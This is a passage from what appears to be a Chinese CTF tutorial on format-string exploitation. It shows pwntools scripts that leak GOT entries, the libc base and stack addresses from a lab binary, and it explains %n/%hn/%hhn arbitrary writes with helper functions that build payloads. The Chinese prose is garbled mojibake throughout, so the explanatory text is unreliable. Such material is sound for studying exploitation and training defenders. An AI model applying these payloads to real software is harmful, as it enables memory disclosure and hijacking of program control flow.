¼å¼åŒ–å­—ç¬¦ï¼ˆ%p/%x/%sï¼‰æ¥æ“ä½œå³å¯ã€‚ç„¶ååœ¨è¿™ä¸ªåœ°æ–¹ï¼Œå…¶æœ‰ä¸ªéš¾ç‚¹å°±æ˜¯<strong>æ‰¾å¯¹åº”çš„æ ˆåç§»</strong>ã€‚åœ¨æˆ‘ä»¬å®é™…ç”¨çš„æ—¶å€™ï¼Œå…¶å®å°±æ˜¯æ‰¾æ ˆä¸Šçš„æŸä¸ªä½ç½®å¯¹åº”è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ï¼Œå¹¶ä¸”ä¹Ÿåˆ†ä¸º32ä½äº64ä½ï¼Œå› ä¸ºå…¶ä¼ å‚æ˜¯ä¸ä¸€æ ·çš„ã€‚<h5 id="ç¡®å®šåç§»"><a href="#ç¡®å®šåç§»" class="headerlink" title="ç¡®å®šåç§»"></a>ç¡®å®šåç§»</h5><h6 id="32ä½"><a href="#32ä½" class="headerlink" title="32ä½"></a>32ä½</h6></li></ol><p><img src="http://qiqianyun.chumen77.xyz/uPic/jYXCSU.png" srcset="/img/loading.gif" alt><br>è¿™æ˜¯32ä½çš„æ ˆå¯¹åº”æƒ…å†µï¼Œæ˜¯æ¯”è¾ƒå¥½ç†è§£çš„ã€‚å¦‚å›¾ï¼Œå¹¶ä¸”å‘ç°è¿™äº›æŒ‡å®šå‚æ•°çš„ï¼ˆå¦‚%4$x),å…¶å°±æ˜¯å¯¹åº”æ‰¾å¯¹åº”æ ˆä¸Šå†…å®¹ ï¼Œè€Œä¸æŒ‡å®šçš„%xå…¶æ‰¾å¯»æ‰¾çš„æ—¶å€™ï¼Œæ˜¯çœ‹ä¸‹å‰é¢æœ‰ä¸ªå‡ ä¸ªå¯¹åº”çš„æ— æŒ‡å®šæ ¼å¼åŒ–å­—ç¬¦ï¼Œå°±æƒ³å›¾ä¸Šçš„æƒ…å†µï¼Œå†ç»™ä¸€ä¸ª%xå…¶æ˜¯ä¼šæ‰¾åˆ°arg4ã€‚</p><h6 id="64ä½"><a href="#64ä½" class="headerlink" title="64ä½"></a>64ä½</h6><p>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/KzxXZK.png" srcset="/img/loading.gif" alt><br>å› ä¸º64ä½çš„å‚æ•°å­˜æ”¾æ˜¯ä¼˜å…ˆå¯„å­˜å™¨(rdi,rsi,rdx,rcx,r8,r9)ï¼Œå æ»¡ä»¥åç¬¬7ä¸ªå‚æ•°æ‰ä¼šå­˜æ”¾åœ¨æ ˆä¸Šã€‚è¿™å°±æ˜¯è·Ÿ32ä½æ‰¾åç§»ä¸åŒåœ°æ–¹ã€‚</p><h6 id="å°æŠ€å·§"><a href="#å°æŠ€å·§" class="headerlink" title="å°æŠ€å·§"></a>å°æŠ€å·§</h6><p>å¯ä»¥ç»™gdbå®‰è£…ä¸€ä¸‹pwndbgï¼Œåœ¨GitHubä¸Šé¢æ‰¾çš„åˆ°ã€‚ç„¶åæ¼”ç¤ºä¸€ä¸‹ï¼š</p><pre><code class="c">#include &lt;stdio.h&gt;int main(){        setvbuf(stdout,0,2,0);        char buf[100];        read(0,buf,99);        printf(buf);}</code></pre><p>gdbè°ƒè¯•ï¼Œæ‰¾å›¾ä¸­æ¡†æ¡†çš„æ ˆåœ°å€ï¼Œå¯¹åº”çš„åç§»ï¼š<br>32ä½ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/MCYXvC.png" srcset="/img/loading.gif" alt><br>64ä½ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/M6uXrw.png" srcset="/img/loading.gif" alt></p><p>æ³¨æ„æ˜¯å¯¹åº”æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ã€‚ç”¨pwndbgçš„fmtargç¡®å®šåç§»ï¼Œå°±ä¸ç”¨æ‹…å¿ƒæ•°é”™äº†ã€‚</p><h5 id="å†™åœ°å€è¿›æ ˆ"><a href="#å†™åœ°å€è¿›æ ˆ" class="headerlink" title="å†™åœ°å€è¿›æ ˆ"></a>å†™åœ°å€è¿›æ ˆ</h5><p>å­¦ä¼šç¡®å®šåç§»åï¼Œå°±å¯ä»¥å†™åœ°å€è¿›æ ˆï¼Œæ¥å®ç°è¯»ä»»æ„åœ°å€å†…å­˜äº†ã€‚ç»å¸¸ä½¿ç”¨çš„æ˜¯ï¼Œ<strong>æŠŠè¿™ä¸ªç¨‹åºä¸­çš„æŸä¸ªgotåœ°å€å†™è¿›æ ˆï¼Œç„¶åå°±å¯ä»¥äº†æ¥è·å–å…¶å†…å®¹ï¼Œç„¶ååœ¨æ ¹æ®å…¶åœ¨libcä¸­çš„åç§»å°±å¯ä»¥è®¡ç®—å‡ºlibcçš„åŸºå€ï¼Œè¿›è€Œç®—å‡ºä»»æ„ä¸€ä¸ªå‡½æ•°çš„åœ°å€ï¼ˆå¦‚systemï¼‰</strong>ã€‚</p><h6 id="32ä½ï¼š"><a href="#32ä½ï¼š" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h6><p>æ ¼å¼ï¼š<code>&lt;address&gt;%&lt;order&gt;$s</code><br>è¿™æ ·å°±å¯ä»¥å°è¯•è¯»å‡ºï¼Œadresså¤„å¯¹åº”çš„å€¼ï¼Œä½†æ˜¯å› ä¸ºæ˜¯%sï¼Œå…¶é‡åˆ°\x00å°±ä¼šç›´æ¥æ–­äº†ï¼Œæ²¡æœ‰æƒ³è¦çš„è¾“å‡ºã€‚æ›´å¸¸æœ‰çš„æƒ…å†µå°±æ˜¯ï¼Œä¼šè¾“å‡ºä¸€å¤§å †ï¼Œç„¶åæˆ‘ä»¬æƒ³è¦çš„åœ°å€æºæ‚åœ¨é‡Œé¢ï¼Œæ‰€ä»¥å¯ä»¥æ”¹è¿›ä¸€ä¸‹ï¼Œå¯ä»¥åŠ ä¸€ç»„æ ‡è®°ï¼Œç„¶åå†å»å–å‡ºæ¥æƒ³è¦ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥æ¥æ£€æµ‹æ˜¯å¦è¢«\x00æˆªæ–­äº†ã€‚<br>æ”¹è¿›æ ¼å¼ï¼š<code>&lt;address&gt;@@%&lt;order&gt;$s@@</code><br>åœ¨ä½¿ç”¨çš„æ—¶å€™è®°å¾—é™¤å» <strong>&lt; &gt;</strong>ã€‚<br>å®ä¾‹ï¼š</p><pre><code class="c">gdb-peda$ got/media/psf/mypwn2/HITCON-Training-master/LAB/lab7/test:     file format elf32-i386DYNAMIC RELOCATION RECORDSOFFSET   TYPE              VALUE08049ffc R_386_GLOB_DAT    __gmon_start__0804a028 R_386_COPY        stdout@@GLIBC_2.00804a00c R_386_JUMP_SLOT   read@GLIBC_2.00804a010 R_386_JUMP_SLOT   printf@GLIBC_2.00804a014 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.40804a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.00804a01c R_386_JUMP_SLOT   setvbuf@GLIBC_2.0</code></pre><p>è·å–ä¸€ä¸‹gotï¼Œé€‰æ‹©read ï¼š 0x0804a00c ,ç„¶åå€ŸåŠ©pwntoolsï¼š</p><pre><code class="c">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test&#39;)payload = p32(0x0804a00c) + &#39;@@%6$s@@&#39;# raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;@@&#39;)print(&#39;leak-&gt;&#39; +hex(u32(io.recv(4))))io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/BP69HU.png" srcset="/img/loading.gif" alt><br>å‘ç°å‡ºç°äº†å¼‚å¸¸ã€‚<br>ä¿®æ”¹ä»£ç ï¼ŒæŸ¥ä¸€ä¸‹readåœ¨libcçš„symbolsï¼š</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test&#39;)elf = ELF(&#39;./test&#39;)libc = elf.libcpayload = p32(0x0804a00c) + &#39;@@%6$s@@&#39;# raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;@@&#39;)print(&#39;leak-&gt;&#39; +hex(u32(io.recv(4))))print(&#39;read-libc.symbols-&gt;&#39; + hex(libc.symbols[&#39;read&#39;]))io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/B6kI8x.png" srcset="/img/loading.gif" alt><br>å‘ç°å°±æ˜¯å› ä¸ºè¿æ°”ä¸å¥½ï¼Œè¿™ä¸ªlibcç‰ˆæœ¬é‡Œæ­£å¥½readå‡½æ•°æ˜¯00ç»“å°¾çš„ï¼Œæ‰€ä»¥æ¢ä¸€ä¸‹:<br>Printf : 0x0804a010<br><img src="http://qiqianyun.chumen77.xyz/uPic/HwQRgy.png" srcset="/img/loading.gif" alt><br>è¿™å°±å¯ä»¥äº†ï¼Œå¹¶ä¸”è¿˜å¯ä»¥çœ‹å‡ºæ¥çš„ç¡®æ˜¯è¾“å‡ºæ¥ä¸€å †ä¸œè¥¿ã€‚</p><h6 id="64ä½-1"><a href="#64ä½-1" class="headerlink" title="64ä½"></a>64ä½</h6><p>åœ¨64ä½ç¨‹åºå½“ä¸­ï¼Œä¸€ä¸ªåœ°å€çš„é«˜ä½å¿…å®šå°±æ˜¯0ï¼Œæ‰€ä»¥<strong>addressæ˜¯ä¸èƒ½å†™åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æœ€å‰é¢çš„</strong>ï¼Œå¯ä»¥è·Ÿåœ¨fmtåé¢ï¼Œä½†æ˜¯è¿™é‡Œå°±ç‰µæ¶‰åˆ°äº†å­—èŠ‚å¯¹é½é—®é¢˜ï¼Œå¹¶ä¸”å…¶åç§»é‡ç®—èµ·æ¥ï¼Œå½“æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åšpaddingæ—¶ï¼Œåç§»é‡æ—¶ä¼šå› ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„é•¿åº¦è€Œå‘ç”Ÿå˜åŒ–çš„ã€‚æ‰€ä»¥è¾ƒå¥½çš„åšæ³•ï¼Œ<strong>å°±æ˜¯åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å¤„åšå¥½paddingï¼Œè¿™æ ·è§£å†³äº†å­—èŠ‚å¯¹é½ï¼Œä¹Ÿè§£å†³äº†åç§»é‡çš„è®¡ç®—ã€‚</strong><br>å®ä¾‹ï¼šï¼ˆè¿˜æ˜¯åˆšåˆšçš„ç¨‹åºç¼–è¯‘æˆ64ä½ï¼‰</p><pre><code class="python">payload = &#39;@@%6$s@@&#39;.ljust(0x28,&#39;a&#39;) + p64(0x000000601020)</code></pre><p>è¿™æ¬¡æŠŠpayloadè¿™æ ·å†™ï¼Œåšå¥½paddingï¼ŒæŠŠaddresså†™åœ¨åé¢ï¼Œæ­¤æ—¶å› ä¸ºåç§»ä¼šå˜ï¼Œgdbè°ƒè¯•ä¸€ä¸‹çœ‹çœ‹ï¼Œåç§»å˜ä¸ºå¤šå°‘ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/t6RmMP.png" srcset="/img/loading.gif" alt><br>å¯ä»¥çœ‹å‡ºæ¥åç§»ä¸º11ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/03RQ1J.png" srcset="/img/loading.gif" alt><br>å‘ç°å†æ¬¡è¿æ°”ä¸å¥½ï¼Œè¿˜æ˜¯å¾—æ¢ä¸€ä¸ªå‡½æ•°æ‰“å°gotï¼Œæ¢æˆreadï¼š</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test3&#39;)elf = ELF(&#39;./test3&#39;)libc = elf.libcpayload = &#39;@@%11$s@@&#39;.ljust(0x28,&#39;a&#39;) + p64(0x000000601028)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;@@&#39;)print(&#39;leak-&gt;&#39; +hex(u64(io.recv(6).ljust(8,&quot;\x00&quot;))))print(&#39;read-libc.symbols-&gt;&#39; + hex(libc.symbols[&#39;read&#39;]))io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/mH8zy0.png" srcset="/img/loading.gif" alt><br>è¿™æ ·å°±OKäº†ã€‚</p><h5 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h5><ol><li>ä½¿ç”¨%s è¯»å–å†…å­˜é‡Œçš„ä»»æ„ä½å€ï¼Œ%s ä¼šæŠŠå¯¹åº”çš„å‚æ•°å½“åš <code>char*</code>æŒ‡æ ‡å¹¶å°†ç›®æ ‡åšä¸ºå­—ç¬¦ä¸²å°å‡ºæ¥</li><li>ä½¿ç”¨é™åˆ¶:Stack ä¸Šè¦æœ‰å¯æ§åˆ¶ addres çš„buffer ;æ³¨æ„ç”±äºæ˜¯å½“åšå­—ç¬¦ä¸²æ‰“å°ï¼Œæ‰€ä»¥åˆ° 0 æ—¶å°±ä¼šä¸­æ–­,ä¹Ÿè¦æ³¨æ„32ä½è·Ÿ64ä½addressçš„å†™åœ¨çš„ä½ç½®ã€‚<h5 id="å°æŠ€å·§-1"><a href="#å°æŠ€å·§-1" class="headerlink" title="å°æŠ€å·§"></a>å°æŠ€å·§</h5><h6 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h6>æƒ³è¦æ³„éœ²libcåŸºå€ï¼Œè¿˜æœ‰å°±æ˜¯é€šè¿‡è¿”å›<code>__libc_start_main + x</code>(libcç‰ˆæœ¬ä¸ä¸€æ ·å¯èƒ½ä¼šä¸ä¸€æ ·ï¼Œæœ¬äººæ˜¯ubuntu16.04)<br><img src="http://qiqianyun.chumen77.xyz/uPic/IFdTkV.png" srcset="/img/loading.gif" alt><br>ç®—ä¸€ä¸‹åç§»æ˜¯21ã€‚<pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test3&#39;)elf = ELF(&#39;./test3&#39;)libc = elf.libcpayload = &#39;%21$p&#39;.ljust(0x8,&#39;a&#39;)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;0x&#39;)libc_base = int(io.recv(12),16) - 240 - libc.symbols[&#39;__libc_start_main&#39;]print(&#39;leak-&gt;&#39; +hex(libc_base))io.interactive()</code></pre>è¿è¡Œè¿™ä¸ªexpæ¥leak libcçš„åŸºå€ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsG4Nl.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/R9cYuX.png" srcset="/img/loading.gif" alt><br>æˆåŠŸäº†ã€‚</li></ol><h6 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h6><p>æ³„éœ²stack address ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/rBKqdw.png" srcset="/img/loading.gif" alt><br>æ­£å¦‚å›¾ä¸­æ‰€ç¤ºï¼Œä¼šå‘ç°æ ˆä¸Šè¯´æœ‰å¾ˆå¤šä¸espæ¥è¿‘çš„æ•°æ®ï¼Œåˆ©ç”¨åˆé€‚çš„æ•°æ®æ ¹æ®åç§»å°±ä¼šæ‹¿åˆ°espçš„å€¼ï¼Œç„¶åå°±å¾—åˆ°äº†satck addressã€‚å¸¸ç”¨çš„ä¹Ÿå°±æ˜¯å¤šå±‚å‡½æ•°è°ƒç”¨æ—¶ï¼Œç•™ä¸‹çš„ebpå€¼ã€‚</p><h3 id="è¦†ç›–å†…å­˜"><a href="#è¦†ç›–å†…å­˜" class="headerlink" title="è¦†ç›–å†…å­˜"></a>è¦†ç›–å†…å­˜</h3><p>è¦†ç›–å†…å­˜é€šå¸¸å…¶å®å°±æ˜¯æ”¹å†™å†…å­˜ï¼Œå…¶ä¸­åˆ†ä¸º<strong>æ”¹å†™æ ˆä¸Šçš„å†…å­˜å’Œä»»æ„åœ°å€çš„å†…å­˜</strong>ï¼Œä»è€Œæ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚ï¼ˆè¿™é‡Œæˆ‘å…ˆåªè®°å½•ä¸€ä¸‹ä»»æ„åœ°å€çš„è¦†ç›–ï¼Œæ”¹å†™æ ˆä¸Šçš„å†…å­˜æš‚æ—¶ç”¨ä¸åˆ°ï¼‰<br>è¿™é‡Œé¢ä¸»è¦æ˜¯ä½¿ç”¨<code>%n</code>, %n  è½¬æ¢æŒ‡ç¤ºç¬¦ä¸è¾“å‡ºå­—ç¬¦ï¼Œå°† å½“å‰printfå‡½æ•°å·²ç»æˆåŠŸå†™å…¥æµæˆ–ç¼“å†²åŒºä¸­çš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚å…¶æ ¸å¿ƒå°±æ˜¯ï¼š<strong>å†™å…¥çš„å€¼ = å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°</strong> ï¼ŒçŸ¥é“è¿™ä¸ªä»¥åï¼Œå…¶<strong>ä½¿ç”¨èµ·æ¥å°±æ˜¯æ§åˆ¶å¥½åœ¨è¿™æ¬¡%nå‰è¾“å‡ºæ­£ç¡®çš„å­—ç¬¦æ•°</strong>ã€‚</p><h4 id="ä»»æ„åœ°å€è¦†ç›–"><a href="#ä»»æ„åœ°å€è¦†ç›–" class="headerlink" title="ä»»æ„åœ°å€è¦†ç›–"></a>ä»»æ„åœ°å€è¦†ç›–</h4><ul><li>ä½¿ç”¨æ–¹æ³•ç±»ä¼¼äº%sçš„ä»»æ„åœ°å€è¯»å–ï¼Œåªæ˜¯æ¢æˆäº†%nã€‚</li><li>ä½¿ç”¨%xcçš„åŠæ³•æ¥æ§åˆ¶è¾“å‡ºçš„å­—ç¬¦æ•°ã€‚<br>åŸºæœ¬æ ¼å¼ï¼š <code>....[overwrite addr]....%[overwrite offset]$n</code><br>å…¶ä¸­<code>....</code> è¡¨ç¤ºæˆ‘ä»¬çš„å¡«å……å†…å®¹ï¼Œ<code>overwrite addr</code> è¡¨ç¤ºæˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€ï¼Œ<code>overwrite offset</code> åœ°å€è¡¨ç¤ºæˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€å­˜å‚¨çš„ä½ç½®ä¸ºè¾“å‡ºå‡½æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬å‡ ä¸ªå‚æ•°ã€‚ä¹Ÿå°±æ˜¯æ„é€ ä¸€ä¸ªéœ€è¦å†™å…¥çš„addressï¼Œç„¶åç”¨%xxcæ¥æ§åˆ¶å†™å…¥çš„å­—ç¬¦æ•°ï¼Œç„¶åæŠŠæ¡å¥½åç§»ã€‚</li></ul><h5 id="fmtå­—ç¬¦ä¸²å†™å…¥å¤§å°"><a href="#fmtå­—ç¬¦ä¸²å†™å…¥å¤§å°" class="headerlink" title="fmtå­—ç¬¦ä¸²å†™å…¥å¤§å°"></a>fmtå­—ç¬¦ä¸²å†™å…¥å¤§å°</h5><p>å› ä¸º%nåœ¨ä¸€æ¬¡çš„å†™å…¥æ˜¯åœ¨ä¸€æ¬¡å½“ä¸­å†™å…¥intå¤§å°çš„æ•´æ•°ï¼Œå½“ä½¿ç”¨%xcæ¥æ§åˆ¶è¾“å‡ºä¸€ä¸ªintå¤§å°çš„å­—ç¬¦ä¸ªæ•°ï¼Œè¿™ä¸ªprintfå‡½æ•°ä¼šè¾“å‡ºååˆ†å¤§çš„å­—ç¬¦æ•°é‡ï¼Œè¿™ä¸ªç»“æœå¯¹æˆ‘ä»¬è¯´ååˆ†ä¸åˆ©çš„ï¼Œä¸€æ–¹é¢è¿œç«¯ç¨‹åºè¾“å‡ºä»¥åï¼Œè‡ªå·±æ¥æ”¶æ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œæ˜¯ååˆ†ä¸ç¨³å®šçš„ï¼Œå¹¶ä¸”æ— æ³•ç²¾å‡†çš„æ§åˆ¶éœ€è¦ä¿®æ”¹çš„åœ°æ–¹ã€‚<br>æ‰€ä»¥å¸¸ç”¨çš„æ˜¯%hn å’Œ%hhnï¼Œåˆ†åˆ«å†™å…¥shortå’Œcharå¤§å°çš„æ•´æ•°ï¼Œç„¶ååˆ†æˆå¤šæ¬¡å†™å…¥ä»¥ç»„åˆæˆå®Œæ•´çš„intæ•´æ•°ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯ååˆ†ç¨³å®šçš„ã€‚</p><h5 id="å•æ¬¡printfå¤šæ¬¡å†™å…¥"><a href="#å•æ¬¡printfå¤šæ¬¡å†™å…¥" class="headerlink" title="å•æ¬¡printfå¤šæ¬¡å†™å…¥"></a>å•æ¬¡printfå¤šæ¬¡å†™å…¥</h5><p>åœ¨è¿›è¡ŒGOT hijackæˆ–è€…æ”¹æ‰æŸä¸€ä¸ªæŒ‡æ ‡çš„æ—¶å€™ï¼Œé€šå¸¸ä¼šè¦æ±‚ä¸€æ¬¡printfå†…å°±è¦æ¥æ”¹å†™å®Œæˆï¼Œä¸ç„¶æ”¹ä¸€åŠçš„å€¼è¿™ä¸ªæŒ‡æ ‡å†è¢«ä½¿ç”¨æ—¶ç¨‹åºå¾ˆå®¹æ˜“å´©æºƒã€‚<br>æ‰€ä»¥å°±å¯ä»¥æŠŠå¤šä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ç»“åˆåœ¨ä¸€æ¬¡ï¼Œä¾‹å¦‚ï¼š</p><pre><code class="python">%xc%offset1$hn %yc%offset2$hn address address+2</code></pre><p>ä½†è¿™æ ·å°±è¯´éœ€è¦å°å¿ƒåç§»ï¼Œå¹¶ä¸”è¾“å‡ºçš„å­—ç¬¦æ•°ä¹Ÿè¦æ§åˆ¶å¥½ã€‚éš¾ç‚¹ä¹Ÿåœ¨æ§åˆ¶è¿™ä¸ªå¤šæ¬¡å†™å…¥æ—¶ï¼Œcå‰é¢åº”è¯¥å¡«å¤šå°‘çš„å€¼ã€‚</p><h5 id="å¤šæ¬¡å†™å…¥æ—¶æ§åˆ¶è¾“å‡ºçš„å­—ç¬¦æ•°"><a href="#å¤šæ¬¡å†™å…¥æ—¶æ§åˆ¶è¾“å‡ºçš„å­—ç¬¦æ•°" class="headerlink" title="å¤šæ¬¡å†™å…¥æ—¶æ§åˆ¶è¾“å‡ºçš„å­—ç¬¦æ•°"></a>å¤šæ¬¡å†™å…¥æ—¶æ§åˆ¶è¾“å‡ºçš„å­—ç¬¦æ•°</h5><p>è¦æ³¨æ„çš„æ˜¯<strong>%nå†™å…¥çš„å€¼æ˜¯å…¶å‰é¢è¾“å‡ºçš„å­—ç¬¦æ•°ã€‚</strong></p><ol><li><p>ç¬¬ä¸€æ¬¡%xc%hhnçš„æ—¶å€™ï¼Œè¦æ‰£æ‰å‰é¢æ‘†æ”¾çš„addressçš„é•¿åº¦ã€‚æ¯”å¦‚32ä½æ—¶ï¼Œå…¶å‰é¢ä¼šæ‘†æ”¾4ä¸ªåœ°å€ï¼Œè¿™ä¸ªæ—¶å€™å°±æ˜¯xéœ€è¦å‡å»4x4 = 16.</p></li><li><p>ä¹‹åæ¯ä¸ª%xc å¿…éœ€æ‰£æ‰å‰ä¸€ä¸ªå†™å…¥ byte çš„å€¼æ€»å­—ç¬¦æ•°æ‰ä¼šæ˜¯è¿™ä¸ªå†™å…¥éœ€è¦çš„é•¿åº¦ã€‚æ¯”å¦‚ ç¬¬ä¸€æ¬¡å†™å…¥å€¼ä¸º 90 ç¬¬äºŒä¸ªå†™å…¥ 120 æ­¤æ—¶åº”ä¸º<code>%30c% offset$hhn</code></p></li><li><p>å½“æŸä¸€æ¬¡å†™å…¥çš„å€¼æ¯”å‰é¢å†™å…¥çš„è¦å°çš„æ—¶å€™ï¼Œå°±éœ€è¦æ•´æ•°overflowå›æ¥ã€‚æ¯”å¦‚ï¼šéœ€è¦å†™å…¥çš„ä¸€ä¸ªå­—èŠ‚ï¼Œç”¨çš„æ˜¯hhnçš„æ—¶å€™ï¼Œå‰é¢é‚£æ¬¡å†™å…¥çš„æ˜¯0x80ï¼Œè¿™æ¬¡å†™å…¥çš„æ˜¯0x50ï¼Œè¿™æ—¶å€™å°±ç”¨0x50å¯ä»¥åŠ ä¸Š0x100ï¼ˆ256ï¼‰=0x150 ï¼ˆè¿™æ—¶å€™å› ä¸ºæ˜¯hhnï¼Œåœ¨æˆªå–çš„æ—¶å€™å°±æ˜¯æˆªå–çš„0x50ï¼‰ï¼Œ å†å‡å»0x80 = 0xD0ï¼ˆ208ï¼‰ï¼Œä¹Ÿå°±æ˜¯å¡«å…¥%208c%offset$hhnå³å¯ã€‚</p></li></ol><p>å½“ç„¶è¿™ä¹Ÿæ˜¯å¾ˆè§„å¾‹çš„ï¼Œåœ¨æ§åˆ¶ä¸€ä¸ªè¾“å‡ºå­—ç¬¦æ•°ï¼Œå°±åˆ†ä¸º3ç§æƒ…å†µï¼š</p><ul><li>å‰é¢å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°å°äºè¿™æ¬¡è¦è¾“å‡ºçš„å­—ç¬¦æ•°</li><li>å‰é¢å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°ç­‰äºäºè¿™æ¬¡è¦è¾“å‡ºçš„å­—ç¬¦æ•°</li><li>å‰é¢å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°å¤§äºè¿™æ¬¡è¦è¾“å‡ºçš„å­—ç¬¦æ•°</li></ul><p>ç„¶åå°±å¯ä»¥å†™æˆä¸€ä¸ªè„šæœ¬æ¥å®ç°è‡ªåŠ¨åŒ–æ§åˆ¶è¿™ä¸ªè¾“å‡ºå­—ç¬¦æ•°ï¼š</p><p>å•å­—èŠ‚ï¼š</p><pre><code class="python"># prev å‰é¢å·²ç»è¾“å‡ºå¤šå°‘å­—ç¬¦# val è¦å†™å…¥çš„å€¼# idx  åç§»def fmt_byte(prev,val,idx,byte = 1):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;    return result#æ­é…ï¼šprev = 0 payload = &quot;&quot;# xå°±æ˜¯ä½ è¦å†™å…¥çš„å­—èŠ‚æ•°ï¼Œä¾‹å¦‚åœ¨æ”¹å†™64ä½gotæ—¶å¸¸ç”¨æ˜¯6ï¼Œå› ä¸ºå…¶å‰ä¸¤ä¸ªå­—èŠ‚éƒ½ä¸€æ ·# idxæ˜¯åç§»ï¼Œkeyæ˜¯è¦å†™å…¥çš„ç›®æ ‡å€¼for i in range(x):    payload +=fmt_byte(prev,(key &gt;&gt; 8*i) &amp; 0xff,idx+i)     prev = (key &gt;&gt; i*8) &amp; 0xff</code></pre><p>åŒå­—èŠ‚ï¼š</p><pre><code class="python">#è·Ÿä¸Šä¸ªåŸºæœ¬ä¸€æ ·ï¼Œåªæ˜¯æ”¹äº†éƒ¨åˆ†åœ°æ–¹def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;for i in range(x):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,idx+i)     prev = (key &gt;&gt; i*16) &amp; 0xffff</code></pre><p>åœ¨ä½¿ç”¨è¿™ä¸¤ä¸ªè„šæœ¬çš„æ—¶å€™ï¼Œå¸¸ç”¨çš„<strong>æ˜¯åœ¨è·å–åˆ°payloadçš„æ—¶å€™ä¹Ÿç”¨<code>payload.ljust()</code>åšå¥½padding,æ¥æ§åˆ¶å¥½å­—èŠ‚å¯¹é½ï¼Œç„¶åå†æ‘†ä¸Šéœ€è¦å†™å…¥xç»„çš„åœ°å€ã€‚ï¼ˆä¸€ä¼šåœ¨é¢˜ç›®ä¸­ä¼šæœ‰æ¼”ç¤ºï¼‰</strong></p><h5 id="pwntools-pwnlib-fmtstr-æ¨¡å—"><a href="#pwntools-pwnlib-fmtstr-æ¨¡å—" class="headerlink" title="pwntools pwnlib.fmtstr æ¨¡å—"></a>pwntools pwnlib.fmtstr æ¨¡å—</h5><pre><code class="python">pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)</code></pre><ul><li>offset (int):ä½ æ§åˆ¶çš„ç¬¬ä¸€ä¸ªæ ¼å¼åŒ–ç¨‹åºçš„åç§»é‡</li><li>writes (dict):æ ¼å¼ä¸º {addr: value, addr2: value2},ç”¨äºå¾€ addr é‡Œå†™å…¥ value (å¸¸ç”¨:<code>{printf_got}</code>)</li><li>numbwritten (int):å·²ç»ç”± printf å‡½æ•°å†™å…¥çš„å­—èŠ‚æ•°</li><li><code>write_size (str)</code>:å¿…é¡»æ˜¯ byte,short æˆ– intã€‚é™åˆ¶ä½ æ˜¯è¦é€ byte å†™,é€ short å†™è¿˜æ˜¯é€ int å†™(hhn,hnæˆ–n)</li></ul><p>è¿™ä¸ªå‡½æ•°æ˜¯ååˆ†å¥½ç”¨çš„ï¼Œå…·ä½“å¯ä»¥å»çœ‹ä¸€ä¸‹pwntoolsçš„å®˜æ–¹ä»‹ç»ï¼Œä½†æ˜¯å®é™…ä½¿ç”¨å½“ä¸­ï¼Œä¼šå‘ç°å‡ 